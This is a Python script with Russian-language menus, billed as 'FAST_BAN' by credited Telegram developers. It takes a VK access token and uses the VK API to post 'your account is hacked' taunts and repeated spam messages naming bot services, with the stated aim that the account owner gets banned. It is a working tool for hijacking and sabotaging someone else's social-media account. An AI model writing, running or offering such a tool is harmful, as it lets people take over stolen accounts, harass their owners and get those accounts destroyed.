import requests
import vk_api
import os
import platform
import time
from colorama import Fore, Back, Style
def fastban():
    intro = """  
    ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒    
    ▒▒▐▐▐▐▐▐▐▐▒▒▒▒▒▒▒▐▐▐▐▐▐▒▒▒▒▒▒▐▐▒▒▒▒▒▐▐▒▒▒▒▒▐▐▒▒
    ▒▒▐▐▒▒▒▒▒▒▒▒▒▒▒▒▒▐▐▒▒▒▐▐▒▒▒▐▐▒▒▐▐▒▒▒▐▐▐▐▒▒▒▐▐▒▒
    ▒▒▐▐▐▐▐▐▒▒▐▐▐▐▐▒▒▐▐▐▐▐▐▒▒▒▒▐▐▒▒▐▐▒▒▒▐▐▒▐▐▒▒▐▐▒▒
    ▒▒▐▐▒▒▒▒▒▒▒▒▒▒▒▒▒▐▐▒▒▒▐▐▒▒▒▐▐▐▐▐▐▒▒▒▐▐▒▒▐▐▒▐▐▒▒
    ▒▒▐▐▒▒▒▒▒▒▒▒▒▒▒▒▒▐▐▒▒▒▐▐▒▒▒▐▐▒▒▐▐▒▒▒▐▐▒▒▒▐▐▐▐▒▒
    ▒▒▐▐▒▒▒▒▒▒▒▒▒▒▒▒▒▐▐▐▐▐▐▒▒▒▒▐▐▒▒▐▐▒▒▒▐▐▒▒▒▒▒▐▐▒▒
    ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
    ▒▒                                           ▒▒
    ▒▒ FAST_BAN DEVOLOPER DARK CODING            ▒▒
    ▒▒ TELEGRAM: @affonsy    CHANNEL @darkkoding ▒▒
    ▒▒ TELEGRAM: @BatyaRimskiy1                  ▒▒
    ▒▒ Beta version 3.0                          ▒▒
    ▒▒                                           ▒▒
    ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
    """
    print(Fore.RED + intro)
    print(Fore.WHITE + """ 
    ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
    |                                             |
    |   1.BAN  Пост-Бан Сова никогда не спит      |
    |   2.BAN  Пост-Бан vkbot.ru                  |
    |   3.BAN  Пост-Бан vto.pe                    |
    |   4.CREDITS                                 |
    |                                             |
    ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
    """)
    a = input("[Enter number] -> ")
    if a == "1":
        tok = input("[ACCESS-TOKEN] -> ") 
        token = vk_api.VkApi(token = tok) 
        vk = token.get_api()
        vk.wall.post(message='Твоя жопа взломана! Привет от Дани!')
        for var in range(5):
            time.sleep(5)
            vk.wall.post(message='Сова никогда не спит')             
            print(Fore.BLACK + Back.GREEN + "[log] Сообщение отправленно. Ожидайте бана!")
        os.system("clear")
        fastban()
    if a == "2":
        tok = input("[ACCESS-TOKEN] -> ") 
        token = vk_api.VkApi(token = tok) 
        vk = token.get_api()
        vk.wall.post(message='Твоя жопа взломана! Привет от Дани!')
        for var in range(5):
            time.sleep(5)
            vk.wall.post(message='vkbot.ru')            
            print(Fore.BLACK + Back.GREEN + "[log] Сообщение отправленно. Ожидайте бана!")
        os.system("clear")
        fastban()
    if a == "3":
        tok = input("[ACCESS-TOKEN] -> ") 
        token = vk_api.VkApi(token = tok) 
        vk = token.get_api()
        vk.wall.post(message='Твоя жопа взломана! Привет от Дани!')
        for var in range(5):
            time.sleep(5)
            vk.wall.post(message='vto.pe')
            print(Fore.BLACK + Back.GREEN + "[log] Сообщение отправленно. Ожидайте бана!")
        os.system("clear")
        fastban()
    if a == "4":
        print("""
        Главный разработчик TELEGRAM: @affonsy
        Разработчик2 TELEGRAM: @BatyaRimskiy1
        
        ЧТО БЫ ВЫЙТИ В ГЛАВНОЕ МЕНЮ НАЖМИТЕ НА Enter 
        """)
        c = input("[Enter] -> ")
        if c == "1":
            os.system("clear")
            fastban()
        else:
            os.system("clear")
            fastban()
fastban()
